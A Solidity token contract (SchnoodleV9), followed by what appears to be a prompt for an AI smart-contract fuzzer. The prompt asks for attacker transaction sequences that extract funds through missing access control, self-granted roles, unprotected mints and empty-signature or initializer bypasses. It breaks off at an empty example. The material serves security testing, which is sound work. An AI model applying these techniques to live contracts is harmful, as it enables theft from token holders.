## Contract Source
```solidity
pragma solidity 0.8.15;

import "./imports/SchnoodleV9Base.sol";
import "@schnoodle/contracts-upgradeable/access/AccessControlUpgradeable.sol";

contract SchnoodleV9 is SchnoodleV9Base, AccessControlUpgradeable {
address private _schnoodleFarming;
address private _farmingFund;
uint256 private _sowRate;

bytes32 public constant LIQUIDITY = keccak256("LIQUIDITY");
bytes32 public constant FARMING_CONTRACT = keccak256("FARMING_CONTRACT");
bytes32 public constant LOCKED = keccak256("LOCKED");

address private _bridgeOwner;
mapping(address => mapping (uint256 => uint256)) private _tokensSent;
mapping(address => mapping (uint256 => uint256)) private _tokensReceived;
mapping(address => mapping (uint256 => uint256)) private _feesPaid;

function configure(bool initialSetup, address liquidityToken, address schnoodleFarming, address bridgeOwner) external onlyOwner {
if (initialSetup) {
_setupRole(DEFAULT_ADMIN_ROLE, owner());
_setupRole(LIQUIDITY, liquidityToken);
_setupRole(FARMING_CONTRACT, schnoodleFarming);
_schnoodleFarming = schnoodleFarming;
_farmingFund = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1))))));
_sowRate = 40;
}

_bridgeOwner = bridgeOwner;
configure(initialSetup);
}

function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal override {

if (from != address(0)) {
uint256 standardAmount = _getStandardAmount(amount);
uint256 balance = balanceOf(from);
require(standardAmount > balance || standardAmount <= balance - lockedBalanceOf(from), "Schnoodle: transfer amount exceeds unlocked balance");
require(!hasRole(LOCKED, from));
}

super._beforeTokenTransfer(operator, from, to, amount);
}

function payFees(address to, uint256 amount, uint256 reflectedAmount) internal override {
super.payFees(to, amount, reflectedAmount);
payFund(to, _farmingFund, amount, _sowRate);
}

function isLiquidityToken(address account) internal view override returns(bool)
{
return hasRole(LIQUIDITY, account);
}

function getFarmingFund() external view returns (address) {
return _farmingFund;
}

function changeSowRate(uint256 rate) external onlyOwner {
_sowRate = rate;
emit SowRateChanged(rate);
}

function getSowRate() external view returns (uint256) {
return _sowRate;
}

function farmingReward(address account, uint256 netReward, uint256 grossReward) external {
require(hasRole(FARMING_CONTRACT, _msgSender()));
_transferFromReflected(_farmingFund, account, _getReflectedAmount(netReward));

_burn(_farmingFund, grossReward - netReward, "", "");
}

function unlockedBalanceOf(address account) external returns (uint256) {
return balanceOf(account) - lockedBalanceOf(account);
}

function getBridgeOwner() external view returns (address) {
return _bridgeOwner;
}

function sendTokens(uint256 networkId, uint256 amount) external {
burn(amount, "");
_tokensSent[_msgSender()][networkId] += amount;
}

function payFee(uint256 networkId) external payable {
_feesPaid[_msgSender()][networkId] += msg.value;
payable(_bridgeOwner).transfer(msg.value);
}

function receiveTokens(address account, uint256 networkId, uint256 amount, uint256 fee) external {
require(_msgSender() == _bridgeOwner, "Schnoodle: Sender must be the bridge owner");
require(_feesPaid[account][networkId] >= fee, "Schnoodle: Insufficient fee paid");

_feesPaid[account][networkId] -= fee;
_mint(account, amount);
_tokensReceived[account][networkId] += amount;
}

function tokensSent(address account, uint256 networkId) external view returns (uint256) {
return _tokensSent[account][networkId];
}

function tokensReceived(address account, uint256 networkId) external view returns (uint256) {
return _tokensReceived[account][networkId];
}

function feesPaid(address account, uint256 networkId) external view returns (uint256) {
return _feesPaid[account][networkId];
}

function maintenance() external onlyOwner {
_maintenance(0x7731a6785a01ea6B606EB8FfAC7d7861c99Dc6BB);
_maintenance(0x294Efa57cB8C5b0299980D8f1eE5F373Bd44a66d);
_maintenance(0xC2B1d3b59C4a9e702AC3823C881417242Bba5830);
_maintenance(0x79A1ddA6625Dc4842625EF05591e4f2322232120);
_maintenance(0x5d22e32398CAE8F8448df5491b50C39B7F271016);
_maintenance(0x587E1eB15a2E98B575f8f4925310684111Be9812);
_maintenance(0x6D257D2dB115947dc0C75d285B4396a03C577E2E);
}

function _maintenance(address sender) private {
address recipient = address(0x78FC40ca8A23cf02654d4A5638Ba4d71BAcaa965);
_revokeRole(LOCKED, sender);
_send(sender, recipient, super.balanceOf(sender), "", "", true);
}

function lockedBalanceOf(address account) private returns(uint256) {
if (_schnoodleFarming == address(0)) return 0;
(bool success, bytes memory result) = _schnoodleFarming.call(abi.encodeWithSignature("lockedBalanceOf(address)", account));
assert(success);
return abi.decode(result, (uint256));
}

event SowRateChanged(uint256 rate);
}
```

## Fuzzing task — strategy: access_control_probe

**Objective:** Build a transaction sequence in which the attacker-controlled address (attacker_address) ends up with more total value (native coin + tokens) than it spent — i.e. extract funds from the target or break a value invariant in the attacker's favor. Use at most 12 calls per sequence.

**Goal:** Find missing access control, owner bypasses, and unprotected token issuance.

**Technique:**
Scan the ABI for STATE-MUTATING functions whose names suggest privileged operations (typical name patterns: set*, change*, update*, upgrade*, transferOwnership*, renounce*, pause*, unpause*, emergency*, drain*, rescue*, sweep*, withdraw*, mint*, burn*, initialize*, init* — but use whatever this ABI actually has). Call ALL such functions from attacker_address (an unprivileged caller) — if any succeeds without reverting on auth, that's an access-control bug. Three high-yield sub-cases to ALWAYS try:
  1. SELF-PROMOTION: for address-type arguments pass attacker_address itself (addOwner/setOwner/addMinter/grantRole(attacker)), or address(0).
  2. UNPROTECTED MINT: call mint*/mintTo* with attacker_address as the recipient and a large amount — the witness is the attacker's token balance rising from zero.
  3. SIGNATURE / INITIALIZER BYPASS: many mints are 'guarded' by a signature or proof check that is trivially passed — supply EMPTY values for those args (empty bytes "0x", empty arrays []), and call initialize*/init* directly even on an already-live contract to seize the mint/owner role.
Prefer breadth: try every suspicious setter and every mint/initialize path, not just the most obvious one. DO NOT default to the names in the example below.

**Value hints:** Use "0x0" for amounts, or "0x3635c9adc5dea00000" (large) for mint amounts. For address params, use attacker_address (self) / target_address / address(0) ("0x0") or 40-hex-digit raw addresses. For signature/proof args use empty bytes "0x" or empty arrays [].

**Valid callers:** "attacker_address"
Use only these alias name(s) in the `caller_name` (msg.sender) slot — there is a
single attacker identity, so every call already runs as the attacker. Never use
"deployer_address" or a raw hex address as a caller. (Address-TYPED ARGUMENTS are
separate: see "Special argument values" below for the aliases those slots accept —
you are NOT restricted to the caller alias there.)
**Special argument values:**
- address-typed args accept `target_address`, `attacker_address`, or a raw 0x literal.
- `"max"` → uint256 max; `"now"` → block.timestamp.
- `"$ret<idx>"` → feed the RETURN VALUE of the call at 0-based index <idx> in this sequence into this argument (that call must return exactly one value).

**Argument encoding (match each value to its ABI parameter type):**
- uint* / bytesN / bytes → hex string, e.g. "0x1f" (minimal, not zero-padded)
- int* (signed) → decimal string, e.g. "-5"
- bool → true or false (JSON literal, unquoted)
- address → an alias name (see callers/aliases above) or a 40-hex-digit 0x literal
- arrays → JSON list, e.g. [] or ["0x1", "0x2"]; tuples/structs → JSON list of their fields
- empty bytes / empty signature / empty proof → "0x" or []

**Output format:**
Return a JSON array of 1 fuzz input object(s):
[
  {
    "calls": [["functionName", [arg1, arg2], "0x<wei_hex>", "caller_name"], ...],
    "description": "brief description"
  }
]
JSON only — no markdown, no explanation.

**Example sequence:**
```json
